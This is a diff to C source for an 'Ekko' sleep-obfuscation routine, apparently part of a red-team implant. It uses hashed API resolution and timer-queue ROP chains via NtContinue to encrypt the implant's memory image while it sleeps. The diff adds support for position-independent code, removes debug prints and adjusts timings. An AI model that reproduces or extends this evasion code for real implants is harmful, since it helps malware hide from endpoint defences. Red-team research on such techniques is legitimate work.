@@ -184,8 +184,6 @@ SEC( text, C ) VOID Ekko ( DWORD SleepTime)
     Instance.Win32.SetEvent = LdrFunction (Instance.Modules.Kernel32, 0x9d7ff713);
     Instance.Win32.DeleteTimerQueue = LdrFunction (Instance.Modules.Kernel32, 0x1b141ede);
 
-    Instance.Win32.printf( "[INFO] Symbols and libraries are loaded!\n");
-
     CONTEXT CtxThread   = { 0 };
     CONTEXT RopProtRW   = { 0 };
     CONTEXT RopMemEnc   = { 0 };
@@ -209,15 +207,21 @@ SEC( text, C ) VOID Ekko ( DWORD SleepTime)
 
     PVOID   NtContinue  = NULL;
     PVOID   SysFunc032  = NULL;
-
+     
     hEvent      = Instance.Win32.CreateEventW( 0, 0, 0, 0 );
     hTimerQueue = Instance.Win32.CreateTimerQueue();
 
-#ifdef ISEXE or ISDLL
+#if defined  ISEXE || defined  ISDLL
     ImageBase   = KaynCaller();
-    Instance.Win32.printf( "[INFO] KaynCAller was called\n" );
     ImageSize   = ( ( PIMAGE_NT_HEADERS ) ( ImageBase + ( ( PIMAGE_DOS_HEADER ) ImageBase )->e_lfanew ) )->OptionalHeader.SizeOfImage;
 #endif
+
+#if defined ISPIC
+
+    ImageBase   = (PBYTE)(Entry - 0x20); // I would use start, but it returns 0 for some reason. So 0x20 below Entry it is.
+    ImageSize   =  C_PTR( GetRIPEnd  + 0x6 + 0x5) - ImageBase; //GetRIPEnd is 0x6 bytes long, and random 0x5 is at the end of the code for some reason
+#endif
+
     Instance.Win32.printf( "[INFO] ImageBase is 0x%llx\n",ImageBase );
     Instance.Win32.printf( "[INFO] ImageSize is 0x%llx\n", ImageSize );
 
@@ -231,7 +235,7 @@ SEC( text, C ) VOID Ekko ( DWORD SleepTime)
     if (  Instance.Win32.CreateTimerQueueTimer( &hNewTimer, hTimerQueue, Instance.Win32.RtlCaptureContext, &CtxThread, 0, 0, WT_EXECUTEINTIMERTHREAD ) )
     {
         
-        Instance.Win32.WaitForSingleObject( hEvent, 0x50 );
+        Instance.Win32.WaitForSingleObject( hEvent, 0x100 );
 
         Instance.Win32.memcpy( &RopProtRW, &CtxThread, sizeof( CONTEXT ) );
         Instance.Win32.memcpy( &RopMemEnc, &CtxThread, sizeof( CONTEXT ) );
@@ -281,6 +285,7 @@ SEC( text, C ) VOID Ekko ( DWORD SleepTime)
 
         
         Instance.Win32.printf( "[INFO] Queue timers\n" );
+        
         Instance.Win32.CreateTimerQueueTimer( &hNewTimer, hTimerQueue, Instance.Win32.NtContinue, &RopProtRW, 100, 0, WT_EXECUTEINTIMERTHREAD );
         Instance.Win32.CreateTimerQueueTimer( &hNewTimer, hTimerQueue, Instance.Win32.NtContinue, &RopMemEnc, 200, 0, WT_EXECUTEINTIMERTHREAD );
         Instance.Win32.CreateTimerQueueTimer( &hNewTimer, hTimerQueue, Instance.Win32.NtContinue, &RopDelay,  300, 0, WT_EXECUTEINTIMERTHREAD );
